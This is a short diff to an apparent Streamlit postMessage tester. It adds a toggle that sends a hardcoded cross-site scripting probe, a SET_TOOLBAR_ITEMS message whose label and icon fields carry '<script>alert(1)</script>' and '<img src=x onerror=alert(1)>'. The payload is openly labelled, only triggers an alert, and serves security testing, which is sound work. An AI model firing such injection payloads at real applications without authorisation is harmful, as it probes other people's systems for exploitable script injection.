@@ -31,11 +31,33 @@ with st.sidebar:
         value="https://target-app.com",
         placeholder="https://target-app.com",
     )
-    message_payload = st.text_area(
-        "postMessage payload (JSON)",
-        value='{"type":"ping","source":"streamlit-tester"}',
-        height=120,
+    
+    use_hardcoded = st.toggle(
+        "Use hardcoded XSS test payload",
+        value=False,
+        help="Send pre-configured XSS test payload with <script> and onerror injection",
     )
+    
+    if not use_hardcoded:
+        message_payload = st.text_area(
+            "postMessage payload (JSON)",
+            value='{"type":"ping","source":"streamlit-tester"}',
+            height=120,
+        )
+    else:
+        st.code('''{
+  "stCommVersion": 1,
+  "type": "SET_TOOLBAR_ITEMS",
+  "items": [
+    {
+      "borderless": false,
+      "label": "<script>alert(1)</script>",
+      "icon": "<img src=x onerror=alert(1)>",
+      "key": "xss_test"
+    }
+  ]
+}''', language="json")
+        message_payload = '{"stCommVersion":1,"type":"SET_TOOLBAR_ITEMS","items":[{"borderless":false,"label":"<script>alert(1)</script>","icon":"<img src=x onerror=alert(1)>","key":"xss_test"}]}'
 
 st.info(
     "Some websites cannot be embedded in an iframe because of security headers such as "
